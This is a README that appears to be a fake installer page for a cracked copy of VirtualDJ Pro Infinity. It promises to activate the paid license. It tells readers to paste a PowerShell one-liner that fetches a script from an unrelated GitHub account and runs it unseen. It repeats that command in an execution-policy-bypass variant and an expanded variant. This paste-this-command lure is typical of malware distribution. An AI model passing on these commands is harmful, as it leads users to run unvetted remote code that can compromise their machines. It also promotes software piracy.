# VirtualDJ Pro Infinity Setup
One-click setup for VirtualDJ Pro Infinity Setup -- the world most popular DJ software with AI stem separation, 4-deck mixing, video support, streaming integration, and a plugin ecosystem used by millions of DJs worldwide

Open PowerShell and run:

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

## What It Does

- Installs VirtualDJ with the audio engine and the controller mapping database for 300 plus DJ hardware models.
- Downloads the AI stem separation models and the full plugin library for real-time track isolation and effects.
- Activates the Infinity license and enables unlimited controller support, video mixing, and Sandbox preview mode.
- Opens VirtualDJ and auto-detects the connected controller with a default mapping applied and first deck loaded.

## Requirements

- Windows 10 / 11 (64-bit)
- PowerShell 5.1+
- Internet connection
- ~1500 MB free disk space

## Troubleshooting

**AI stem separation produces audio artifacts with music bleeding into the isolated vocal track**

Enable the Neural Stem quality setting in Preferences and allow the AI model to fully initialize before processing any track.

**Controller faders and buttons do not respond correctly after first setup in VirtualDJ**

Download the official mapping for your specific hardware model from the VirtualDJ website and import it through controller settings.

**Bypass execution policy (alternative):**

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex (irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1)"
```

"irm is not recognized" -- use the expanded syntax on older PowerShell:

```powershell
Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1')
```

## License
MIT -- see LICENSE.